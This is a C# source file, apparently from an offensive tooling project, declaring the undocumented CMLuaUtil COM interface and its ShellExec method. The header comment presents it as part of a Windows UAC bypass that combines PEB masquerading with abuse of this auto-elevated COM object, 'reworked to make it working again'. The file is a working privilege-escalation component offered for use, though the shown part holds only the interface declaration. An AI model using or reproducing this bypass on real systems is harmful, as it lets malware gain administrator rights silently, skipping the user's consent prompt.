using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

/*
|| AUTHOR : UAC bypass method from Oddvar Moe aka api0cradle. ||
            * ucmCMLuaUtilShellExecMethod
            *
            * Purpose:
            *
            * Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
            * This function expects that supMasqueradeProcess was called on process initialization.
            *
|| Original C# version :  https://github.com/0xlane/BypassUAC ||
|| github : https://github.com/arsium       ||
|| This method combines PEB masquerading + abusing com object. Reworked imports in C# to make it working again :) ||
*/

namespace Special
{
    internal partial class Commons
    {
        [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface ILua
        {
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method1();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method2();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method3();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method4();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method5();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            void Method6();
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), PreserveSig]
            Launch.HRESULT ShellExec(
                [In, MarshalAs(UnmanagedType.LPWStr)] string file,
                [In, MarshalAs(UnmanagedType.LPWStr)] string paramaters,
                [In, MarshalAs(UnmanagedType.LPWStr)] string directory,
                [In] uint fMask,
                [In] uint nShow);
        }
    }
}
